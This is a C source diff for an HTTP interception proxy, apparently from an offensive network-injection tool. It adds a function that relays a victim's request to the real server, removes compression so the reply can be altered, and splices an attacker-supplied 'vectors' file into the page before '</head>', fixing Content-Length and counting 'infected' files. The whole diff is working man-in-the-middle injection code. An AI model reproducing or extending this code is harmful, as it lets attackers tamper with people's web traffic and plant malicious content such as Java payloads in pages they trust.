@@ -25,6 +25,8 @@ void sanitize_header(char *header);
 int fix_content_lenght(char *header, int len);
 int proxy_inject_html(BIO **cbio, BIO **sbio, char *header, char *file, char *tag, char *host, char *ip, char *url);
 BIO* BIO_new_inject_html(const char *file, const char *tag, const char *host);
+BIO *BIO_new_inject_html_file(const char *file, const char *tag, const char *host);
+
 
 /************************************************/
 
@@ -34,22 +36,7 @@ int proxy_inject_html(BIO **cbio, BIO **sbio, char *header, char *file, char *ta
    char *data;
    int data_len;
    int len, written;
-//   char *host, *p;
    int inject_len;
-
-//   /* retrieve the host tag */
-//   host = strcasestr(header, HTTP_HOST_TAG);
-
-//  if (host == NULL)
-//      return -EINVALID;
-
-//   SAFE_STRDUP(host, host + strlen(HTTP_HOST_TAG));
-
-//   /* trim the eol */
-//   if ((p = strchr(host, '\r')) != NULL)
-//      *p = 0;
-//   if ((p = strchr(host, '\n')) != NULL)
-//      *p = 0;
 
    /* connect to the real server */
    *sbio = BIO_new(BIO_s_connect());
@@ -133,11 +120,142 @@ int proxy_inject_html(BIO **cbio, BIO **sbio, char *header, char *file, char *ta
    return ESUCCESS;
 }
 
+int proxy_inject_html_file(BIO **cbio, BIO **sbio, char *header, char *file, char *tag, char *host, char *ip, char *url)
+{
+   BIO *fbio = NULL;
+   char *data;
+   int data_len;
+   int len, written;
+   int inject_len;
+
+   /* connect to the real server */
+   *sbio = BIO_new(BIO_s_connect());
+   BIO_set_conn_hostname(*sbio, host);
+   BIO_set_conn_port(*sbio, "http");
+
+   if (BIO_do_connect(*sbio) <= 0) {
+      DEBUG_MSG(D_ERROR, "Cannot connect to [%s]", host);
+      return -ENOADDRESS;
+   }
+
+   DEBUG_MSG(D_INFO, "Connection html to [%s]", host);
+
+   /*
+    * sanitize the header to avoid strange reply from the server.
+    * we don't want to cope with chunked encoding, gzip, deflate, 304 Not Modified an so on...
+    */
+   sanitize_header(header);
+
+   DEBUG_MSG(D_EXCESSIVE, "header: [%s]", header);
+
+   /* send the request to the server */
+   BIO_puts(*sbio, header);
+
+   SAFE_CALLOC(data, READ_BUFF_SIZE, sizeof(char));
+   written = 0;
+
+   /* read the reply header from the server */
+   LOOP {
+      len = BIO_read(*sbio, data + written, sizeof(char));
+      if (len <= 0)
+         break;
+
+      written += len;
+      if (strstr(data, CR LF CR LF) || strstr(data, LF LF))
+         break;
+   }
+
+   /* if the reply is OK and the file exist, set up the injecting filter */
+   if (!strncmp(data, HTTP10_200_OK, strlen(HTTP10_200_OK)) || !strncmp(data, HTTP11_200_OK, strlen(HTTP11_200_OK))) {
+      struct bio_inject_setup bis;
+
+      DEBUG_MSG(D_INFO, "Injecting html file into [%s] reply...", host);
+
+      fbio = BIO_new_inject_html_file(file, tag, host);
+
+      /* get the inject len */
+      BIO_ctrl(fbio, BIO_C_GET_BUF_MEM_PTR, 1, &bis);
+      inject_len = bis.inject_len;
+
+      /* update the stats */
+      GBL_STATS->inf_files++;
+   } else {
+
+      DEBUG_MSG(D_INFO, "Server [%s] reply is not HTTP 200 OK", host);
+      DEBUG_MSG(D_DEBUG, "Server reply is:\n%s", data);
+
+      /* create a null filtering bio (send as it is) */
+      fbio = BIO_new(BIO_f_null());
+      inject_len = 0;
+   }
+
+   /* append the filter to the client bio */
+   *cbio = BIO_push(fbio, *cbio);
+
+   /* check for gzip compression */
+   if (strstr(data, ": gzip")) {
+      DEBUG_MSG(D_ERROR, "ERROR: GZIP compression detected, cannot attack !!");
+   }
+
+   /* fix the Content-Length in the html header */
+   data_len = fix_content_lenght(data, inject_len);
+
+   DEBUG_MSG(D_EXCESSIVE, "data: [%s]", data);
+
+   /* send the headers to the client, the data will be sent in the callee function */
+   BIO_write(*cbio, data, data_len);
+   
+   SAFE_FREE(data);
+   
+   return ESUCCESS;
+}
+
+BIO *BIO_new_inject_html_file(const char *file, const char *tag, const char *host)
+{
+   BIO *bio = NULL;
+   FILE *f;
+   char *html_to_inject;
+   size_t html_to_inject_len;
+   struct bio_inject_setup bis;
+
+   f = open_data("vectors", (char *)file, "rb");
+   if (f == NULL)
+      return BIO_new(BIO_f_null());
+   
+   fseek(f, 0L, SEEK_END);
+   html_to_inject_len = ftell(f);
+   fseek(f, 0L, SEEK_SET);
+
+   DEBUG_MSG(D_INFO, "[*] BIO_new_inject_html_file size: %08x\n", html_to_inject_len);
+
+   SAFE_CALLOC(html_to_inject, html_to_inject_len, sizeof(char));
+   if (html_to_inject == NULL)
+   {
+      DEBUG_MSG(D_INFO, "[*] BIO_new_inject_html_file calloc fail!\n");
+      return BIO_new(BIO_f_null());
+   }
+
+   if (fread(html_to_inject, 1, html_to_inject_len, f) != html_to_inject_len)
+   {
+      DEBUG_MSG(D_INFO, "[*] BIO_new_inject_html_file fread fail!\n");
+      return BIO_new(BIO_f_null());
+   }
+
+   bio = BIO_new(BIO_f_inject());
+
+   bis.search = "</head>";
+   bis.inject = html_to_inject;
+   bis.inject_len = html_to_inject_len;
+
+   BIO_ctrl(bio, BIO_C_SET_BUF_MEM, 1, &bis);
+   
+   SAFE_FREE(html_to_inject);
+   return bio;
+}
 
 BIO* BIO_new_inject_html(const char *file, const char *tag, const char *host)
 {
    BIO* bio = NULL;
-   FILE *f;
    //char cer_file[strlen(file) + strlen(".cer") + 1];
    char html_file[strlen(file) + strlen(".html") + 1];
    char jar_file[strlen(file) + strlen(".jar") + 1];
@@ -181,7 +299,7 @@ BIO* BIO_new_inject_html(const char *file, const char *tag, const char *host)
    bio = BIO_new(BIO_f_inject());
 
    /* set the search string and the injection buffer */
-   bis.search = "<head>";
+   bis.search = "</head>";
    bis.inject = html_to_inject;
    bis.inject_len = html_to_inject_len;
 
